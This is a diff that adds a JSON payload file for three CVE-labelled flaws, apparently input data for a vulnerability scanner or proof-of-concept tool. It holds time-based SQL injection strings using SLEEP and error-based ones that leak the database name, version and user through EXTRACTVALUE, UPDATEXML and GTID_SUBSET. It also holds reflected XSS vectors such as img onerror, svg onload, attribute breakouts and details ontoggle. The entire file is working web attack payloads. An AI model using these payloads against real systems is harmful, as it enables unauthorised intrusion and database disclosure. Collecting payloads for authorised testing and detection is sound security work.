@@ -1,0 +1,118 @@
+{
+  "cve_18662_install_sqli": {
+    "sqli_time": [
+      {
+        "type": "SQLI_TIME",
+        "family": "poc_original",
+        "payload": "12'; select sleep(5)#"
+      },
+      {
+        "type": "SQLI_TIME",
+        "family": "sleep_dash",
+        "payload": "test_'; SELECT SLEEP(5)-- -"
+      },
+      {
+        "type": "SQLI_TIME",
+        "family": "sleep_or",
+        "payload": "a' OR SLEEP(5)#"
+      },
+      {
+        "type": "SQLI_TIME",
+        "family": "if_sleep",
+        "payload": "x' AND IF(1=1,SLEEP(5),0)#"
+      },
+      {
+        "type": "SQLI_TIME",
+        "family": "sleep_subquery",
+        "payload": "x'; SELECT IF(1=1,SLEEP(5),0)#"
+      }
+    ],
+    "sqli_error": [
+      {
+        "type": "SQLI_ERROR",
+        "family": "extractvalue",
+        "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))#"
+      },
+      {
+        "type": "SQLI_ERROR",
+        "family": "updatexml",
+        "payload": "x' AND UPDATEXML(1,CONCAT(0x7e,version()),1)#"
+      },
+      {
+        "type": "SQLI_ERROR",
+        "family": "gtid_subset",
+        "payload": "x' AND GTID_SUBSET(CONCAT(0x7e,database()),0)#"
+      },
+      {
+        "type": "SQLI_ERROR",
+        "family": "extractvalue_user",
+        "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))#"
+      }
+    ]
+  },
+
+  "cve_18661_login_xss": {
+    "xss_url": [
+      {
+        "type": "REFLECTED_XSS",
+        "family": "script_basic",
+        "payload": "<script>alert(1)</script>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "img_onerror",
+        "payload": "<img src=x onerror=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "svg_onload",
+        "payload": "<svg onload=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "javascript_uri",
+        "payload": "javascript:alert(document.domain)"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "value_breakout",
+        "payload": "\"><img src=x onerror=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "event_onmouseover",
+        "payload": "\" onmouseover=alert(1) x=\""
+      }
+    ]
+  },
+
+  "cve_18663_move_xss": {
+    "xss_move": [
+      {
+        "type": "REFLECTED_XSS",
+        "family": "script_basic",
+        "payload": "<script>alert(1)</script>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "img_onerror",
+        "payload": "<img src=x onerror=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "svg_onload",
+        "payload": "<svg onload=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "value_breakout",
+        "payload": "\"><img src=x onerror=alert(1)>"
+      },
+      {
+        "type": "REFLECTED_XSS",
+        "family": "details_ontoggle",
+        "payload": "<details open ontoggle=alert(1)>"
+      }
+    ]
+  }
+}
